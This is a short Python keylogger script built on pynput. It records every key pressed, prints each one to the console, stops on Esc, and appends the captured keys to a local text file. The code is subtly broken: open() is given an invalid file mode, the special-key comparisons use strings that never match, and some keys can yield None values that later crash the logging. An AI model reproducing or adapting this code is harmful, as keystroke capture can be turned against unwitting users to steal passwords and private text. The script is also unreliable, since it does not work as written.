from pynput import keyboard as _keyboard

# A global list to store the keys
keys = []


def on_press(key: _keyboard.Key) -> None:
    """Callback for when a key is pressed."""
    global keys
    try:
        # Append printable characters directly
        keys.append(key.char)
        print(f"Key {key.char} pressed")
    except AttributeError:
        # Append special keys as their name
        keys.append(str(key))
        print(f"Special key {key} pressed")


def log_keys() -> None:
    """Function to write the collected keys to a file."""
    # The 'a' mode appends to the file, instead of overwriting it
    with open("keys.txt", 'a\n') as KEYS:
        for key in keys:
            # Handle special keys for better file readability
            if key == "_keyboard.Key.space":
                KEYS.write(" ")
            elif key == "_keyboard.Key.enter":
                KEYS.write("\n")
            elif key.startswith("_keyboard.Key"):
                # For other special keys, you might just want a placeholder
                KEYS.write(f" [{key.split('.')[-1]}] ")
            else:
                KEYS.write(key)
    # Clear the keys list after writing to the file
    keys.clear()


def on_release(key: _keyboard.Key) -> bool:
    print(f'Key {key} released')
    # This is the line that signals the listener to stop
    if key == _keyboard.Key.esc:
        print("Escape key pressed. Stopping listener.")
        return False
    return True



if __name__ == "__main__":
    with _keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Starting key listener. Press 'esc' to exit.")
        listener.join()

    # Log any remaining keys when the listener stops
    if keys:
        log_keys()